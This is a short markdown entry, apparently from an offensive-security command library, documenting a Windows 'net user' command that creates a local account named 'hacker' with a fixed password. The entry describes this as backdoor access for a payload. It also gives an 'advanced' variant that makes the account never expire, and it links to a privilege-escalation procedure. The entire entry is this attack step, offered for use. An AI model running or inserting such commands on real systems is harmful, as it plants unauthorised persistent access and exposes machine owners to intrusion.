---
data: net user hacker P@ssword! /add
tags:
  - account
  - escalation
type: command
output: The command completed successfully.
executor: cmd
platforms:
  - Windows
id: 8cbf6fcb-78b4-409b-9c04-f3fca3b3539d
created_at: '2025-12-14T17:26:17.527Z'
updated_at: '2025-12-14T17:26:17.527Z'
verified: false
validated: true
submitted: true
---
# add-local-user

## Command

```cmd
net user hacker P@ssword! /add
```

## Description

Creates a new local user account with specified credentials, used in the payload for backdoor access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| hacker | Username | Yes |
| P@ssword! | Password | Yes |
| /add | Add user flag | Yes |

## Examples

### Basic Usage

```cmd
net user hacker P@ssword! /add
```

### Advanced Usage

```cmd
net user hacker P@ssword! /add /fullname:"Hacker User" /expires:never
```

## Expected Output

Success message; user added to system.

## Related

- [[procedures/Perform-Privilege-Escalation-via-Payload-Execution]]
